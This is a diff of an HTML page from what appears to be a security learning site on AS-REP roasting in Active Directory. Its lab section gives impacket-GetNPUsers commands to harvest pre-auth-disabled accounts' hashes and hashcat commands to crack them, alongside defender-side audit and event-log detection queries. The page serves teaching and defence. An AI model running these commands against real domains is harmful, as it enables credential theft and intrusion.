-<li><a href="../security-playbooks/detect-kerberoasting-and-as-rep-roasting.html">Detect Kerberoasting and AS-REP Roasting</a> — the defender-side playbook pair for this note.</li>
-<li><a href="../offensive-security/enumeration.html">Enumeration</a> — username enumeration is the prerequisite step.</li>
-<li><a href="../offensive-security/passive-recon.html">Passive recon</a> — where username lists come from.</li>
-</ul>
-<h3 id="suggested-future-atomic-notes">Suggested future atomic notes</h3>
-<ul>
-<li><span class="unresolved-link" title="Unpublished or unresolved: username-enumeration-against-kerberos">username-enumeration-against-kerberos</span> — <code>kerbrute userenum</code>, <code>KRB-ERROR</code> timing differentials, lockout-policy implications.</li>
-<li><span class="unresolved-link" title="Unpublished or unresolved: kerberos-preauth-and-encryption-types">kerberos-preauth-and-encryption-types</span> — the <code>PA-ENC-TIMESTAMP</code> mechanism, encryption-type negotiation, and why <code>DONT_REQ_PREAUTH</code> is structurally dangerous.</li>
-<li><span class="unresolved-link" title="Unpublished or unresolved: useraccountcontrol-flags-as-attack-surface">useraccountcontrol-flags-as-attack-surface</span> — every dangerous bit in <code>userAccountControl</code> (kerberos delegation, password-not-required, smartcard-required quirks, etc.).</li>
-</ul>
-<h2 id="references">References</h2>
-<ul>
-<li><strong>Foundational:</strong> MITRE ATT&amp;CK T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting — https://attack.mitre.org/techniques/T1558/004/</li>
-<li><strong>Research / Deep Dive:</strong> Will Schroeder (harmj0y) — Roasting AS-REPs — https://blog.harmj0y.net/activedirectory/roasting-as-reps/</li>
-<li><strong>Research / Deep Dive:</strong> Sean Metcalf (ADSecurity.org) — Detecting Kerberoasting Activity — https://adsecurity.org/?p=3458</li>
-</ul>
+<p>``` # Lab 1 — Create a pre-auth-disabled account in a lab AD. New-ADUser -Name &quot;legacy_user&quot; -SamAccountName &quot;legacy_user&quot; `     -AccountPassword (ConvertTo-SecureString &quot;Spring2019!&quot; -AsPlainText -Force) `     -Enabled $true Set-ADAccountControl -Identity legacy_user -DoesNotRequirePreAuth $true # This account is now AS-REP-roastable from any unauthenticated host on the network. ```</p>
+<p>``` # Lab 2 — Enumerate pre-auth-disabled accounts WITHOUT credentials. # Username list (build from OSINT, kerbrute, leaks). cat &gt; users.txt &lt;&lt;EOF administrator legacy_user backup_admin svc_legacy_unix random_user EOF</p>
+<p>impacket-GetNPUsers LAB.LOCAL/ -dc-ip 10.0.0.1 \     -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash cat asrep.hash # Output contains $krb5asrep$23$* lines — one per vulnerable account. ```</p>
+<p>``` # Lab 3 — Enumerate the vulnerable list via authenticated LDAP (if you have any cred). impacket-GetNPUsers LAB.LOCAL/lowpriv:&#x27;Password1&#x27; -dc-ip 10.0.0.1 -request # This automatically queries LDAP for the flag bitmask and roasts every match. ```</p>
+<p>``` # Lab 4 — Crack offline. hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force # Mode 18200 = AS-REP RC4-HMAC. Use 33100 for AES variants. ```</p>
+<p>``` # Lab 5 — Audit your own AD for pre-auth-disabled accounts (defender side). Get-ADUser -Filter &#x27;DoesNotRequirePreAuth -eq $true&#x27; -Properties DoesNotRequirePreAuth |     Select-Object SamAccountName, Enabled, DistinguishedName, LastLogonDate # Every row is a candidate finding. Either re-enable pre-auth or harden the password. ```</p>
+<p>``` # Lab 6 — Validate detection from the defender side. # After running the roasting against an authorized lab, check the DC&#x27;s Security log: Get-WinEvent -FilterHashtable @{LogName=&#x27;Security&#x27;; ID=4768} -MaxEvents 50 |     Where-Object { $_.Properties[10].Value -eq &#x27;0&#x27; }   # PreAuthType = 0 # Every result is an AS-REP-roasting attempt by definition. # Build a SIEM detection rule from this filter. ```</p>
+<h2>Practical examples</h2>
+<ul><li>**OSINT-only initial compromise.** Attacker gathers ten employee email addresses from LinkedIn. One of them (`legacy_user@corp.com`) is a 2011-era account whose owner left the company in 2014. AS-REP roast returns a crackable hash; the password is the user&#x27;s first name plus their start year. Domain context established without ever interacting with the target as an authenticated user.</li><li>**Post-merger forest enumeration.** Newly-merged subsidiary domain has a transitive trust. Attacker (authenticated in parent forest) queries the subsidiary&#x27;s LDAP, finds 12 accounts with `DONT_REQ_PREAUTH`, roasts all 12, cracks two with rockyou.txt — pivot into the subsidiary domain follows.</li><li>**UNIX-integration ghost account.** Account `unix_kdc_proxy` was created in 2008 to bridge an MIT Kerberos realm. The realm was decommissioned in 2012. The account remained, with pre-auth disabled and the original password (`Welcome123`). Recovered in seconds.</li><li>**Service account hardening miss.** A defender claims &quot;we have no pre-auth-disabled accounts&quot;. LDAP query returns 7. Three are legacy admins. One is in `Backup Operators`. The audit step took 90 seconds and immediately yields a major finding.</li><li>**Honey-account catches red team.** Defender plants `svc_legacy_unix2` with pre-auth disabled and a 40-character random password. Six months later a red team performs unauthenticated AS-REP roasting from a beachhead; the only account that responds to their queries is the honey account, triggering a high-confidence alert that ends the engagement.</li></ul>
+<h2>Related notes</h2>
+<ul><li>&lt;a href=&quot;kerberoasting.html&quot;&gt;kerberoasting&lt;/a&gt; — the sister attack; same offline-cracking economics, different protocol step, different precondition (needs a credential).</li><li>&lt;a href=&quot;silver-ticket-and-service-account-persistence.html&quot;&gt;silver-ticket-and-service-account-persistence&lt;/a&gt; — one downstream use of recovered service-account key material when a roasted account owns SPNs.</li><li>&lt;a href=&quot;../cryptography/password-hashing.html&quot;&gt;Password hashing&lt;/a&gt; — the KDF strength is what determines crack cost on both AS-REP and TGS hashes.</li><li>&lt;a href=&quot;../cryptography/symmetric-encryption-modes.html&quot;&gt;Symmetric encryption modes&lt;/a&gt; — RC4 vs AES in the Kerberos context.</li><li>&lt;a href=&quot;../cryptography/kdf-and-key-stretching.html&quot;&gt;KDF and key stretching&lt;/a&gt; — offline cracking economics 101.</li><li>&lt;a href=&quot;../foundations/cia-triad-and-what-it-actually-decides.html&quot;&gt;CIA triad&lt;/a&gt; — AS-REP roasting is primarily an integrity + authenticity breach (impersonation enabled by recovered password).</li><li>&lt;a href=&quot;../foundations/attacker-defender-duality-as-a-learning-tool.html&quot;&gt;Attacker-Defender Duality&lt;/a&gt; — pair this note with detection-side counterparts before claiming you understand it.</li><li>&lt;a href=&quot;../detection-engineering/behavioral-detection-vs-signature-detection.html&quot;&gt;Behavioral vs signature detection&lt;/a&gt; — the only useful detection framing here.</li><li>&lt;a href=&quot;../detection-engineering/attack-path-correlation-and-kill-chain-observability.html&quot;&gt;Attack path correlation&lt;/a&gt; — AS-REP roasting chained with later auth attempts produces high-confidence telemetry.</li><li>&lt;a href=&quot;../security-playbooks/detect-kerberoasting-and-as-rep-roasting.html&quot;&gt;Detect Kerberoasting and AS-REP Roasting&lt;/a&gt; — the defender-side playbook pair for this note.</li><li>&lt;a href=&quot;../offensive-security/enumeration.html&quot;&gt;Enumeration&lt;/a&gt; — username enumeration is the prerequisite step.</li><li>&lt;a href=&quot;../offensive-security/passive-recon.html&quot;&gt;Passive recon&lt;/a&gt; — where username lists come from.</li></ul>
+<h3>Suggested future atomic notes</h3>
+<ul><li>username-enumeration-against-kerberos — `kerbrute userenum`, `KRB-ERROR` timing differentials, lockout-policy implications.</li><li>kerberos-preauth-and-encryption-types — the `PA-ENC-TIMESTAMP` mechanism, encryption-type negotiation, and why `DONT_REQ_PREAUTH` is structurally dangerous.</li><li>useraccountcontrol-flags-as-attack-surface — every dangerous bit in `userAccountControl` (kerberos delegation, password-not-required, smartcard-required quirks, etc.).</li></ul>
+<h2>References</h2>
+<ul><li>**Foundational:** MITRE ATT&amp;CK T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting — https://attack.mitre.org/techniques/T1558/004/</li><li>**Research / Deep Dive:** Will Schroeder (harmj0y) — Roasting AS-REPs — https://blog.harmj0y.net/activedirectory/roasting-as-reps/</li><li>**Research / Deep Dive:** Sean Metcalf (ADSecurity.org) — Detecting Kerberoasting Activity — https://adsecurity.org/?p=3458</li></ul>
 <nav class="branch-nav" aria-label="Within this branch"><span class="branch-nav-spacer"></span><a class="branch-nav-link next" href="bloodhound-attack-path-analysis.html"><span class="nav-dir">Next →</span><strong>BloodHound and Attack Path Analysis</strong></a></nav>
-<section class="related-notes" aria-label="Explore nearby notes">
-<h2>Explore nearby notes</h2>
+<section class="related-notes" aria-label="Related notes">
+<h2>Related notes</h2>
 <div class="related-grid">
-<a class="related-card" href="kerberoasting.html"><span>Identity &amp; Active Directory</span><strong>Kerberoasting</strong><small>Kerberoasting is an Active Directory credential attack where an authenticated domain user requests **TGS service tickets** for accounts that have a Service...</small></a>
-<a class="related-card" href="golden-ticket-and-krbtgt-compromise.html"><span>Identity &amp; Active Directory</span><strong>Golden Ticket and KRBTGT Compromise</strong><small>A Golden Ticket is a forged Kerberos **Ticket Granting Ticket** (TGT) created with the compromised long-term key material of the domain&#x27;s krbtgt account. It is not...</small></a>
-<a class="related-card" href="silver-ticket-and-service-account-persistence.html"><span>Identity &amp; Active Directory</span><strong>Silver Ticket and Service Account Persistence</strong><small>A Silver Ticket is a forged Kerberos **service ticket** (TGS) created with a compromised service account key rather than the domain-wide krbtgt key. It is...</small></a>
 <a class="related-card" href="bloodhound-attack-path-analysis.html"><span>Identity &amp; Active Directory</span><strong>BloodHound and Attack Path Analysis</strong><small>BloodHound is an open-source graph-analysis tool that models **Active Directory as a directed graph of principals** (users, groups, computers, GPOs, OUs, domains)...</small></a>
 <a class="related-card" href="dcsync-and-ntdsdit-extraction.html"><span>Identity &amp; Active Directory</span><strong>DCSync and ntds.dit Extraction</strong><small>DCSync is an AD credential-extraction attack where the attacker abuses the **DS-Replication-Get-Changes-All** and related directory-replication rights to make...</small></a>
 <a class="related-card" href="gmsa-and-modern-service-account-hardening.html"><span>Identity &amp; Active Directory</span><strong>gMSA and Modern Service Account Hardening</strong><small>A group Managed Service Account (gMSA) is an Active Directory-managed service identity whose password is long, random, automatically rotated, and retrievable only...</small></a>
+<a class="related-card" href="golden-ticket-and-krbtgt-compromise.html"><span>Identity &amp; Active Directory</span><strong>Golden Ticket and KRBTGT Compromise</strong><small>A Golden Ticket is a forged Kerberos **Ticket Granting Ticket** (TGT) created with the compromised long-term key material of the domain&#x27;s krbtgt account. It is not...</small></a>
+<a class="related-card" href="identity-attack-paths-across-idps.html"><span>Identity &amp; Active Directory</span><strong>Identity Attack Paths Across IdPs</strong><small>Cross-IdP attack paths are lateral-movement chains that propagate compromise *across platform boundaries* by traversing the trust edges — **federation, directory...</small></a>
+<a class="related-card" href="kerberoasting.html"><span>Identity &amp; Active Directory</span><strong>Kerberoasting</strong><small>Kerberoasting is an Active Directory credential attack where an authenticated domain user requests **TGS service tickets** for accounts that have a Service...</small></a>
 </div></section>
 </article>
 </main>
-<aside class="toc" aria-label="On this page"><div class="toc-inner"><h2>On This Page</h2>
-<a class="toc-level-2" href="#definition">Definition</a>
-<a class="toc-level-2" href="#why-it-matters">Why it matters</a>
-<a class="toc-level-2" href="#how-it-works">How it works</a>
-<a class="toc-level-2" href="#techniques-patterns">Techniques / patterns</a>
-<a class="toc-level-2" href="#variants-and-bypasses">Variants and bypasses</a>
-<a class="toc-level-3" href="#1-classic-as-rep-roasting-no-creds">1. Classic AS-REP Roasting (no creds)</a>
-<a class="toc-level-3" href="#2-credentialed-as-rep-roasting">2. Credentialed AS-REP Roasting</a>
-<a class="toc-level-3" href="#3-targeted-single-user-as-rep-roasting">3. Targeted (single-user) AS-REP Roasting</a>
-<a class="toc-level-2" href="#impact">Impact</a>
-<a class="toc-level-2" href="#detection-and-defense">Detection and defense</a>
-<a class="toc-level-3" href="#what-does-not-work-as-a-primary-defense">What does not work as a primary defense</a>
-<a class="toc-level-2" href="#practical-labs">Practical labs</a>
-<a class="toc-level-2" href="#practical-examples">Practical examples</a>
-<a class="toc-level-2" href="#related-notes">Related notes</a>
-<a class="toc-level-3" href="#suggested-future-atomic-notes">Suggested future atomic notes</a>
-<a class="toc-level-2" href="#references">References</a>
-<a class="back-to-top" href="#top">Back to top</a></div></aside>
+
 </div>
 </div>
 </div>
-<script src="../../../assets/search.js?v=6d139dc885"></script>
+<script src="../../../assets/search.js?v=99fbda06b7"></script>
 </body>
 </html>
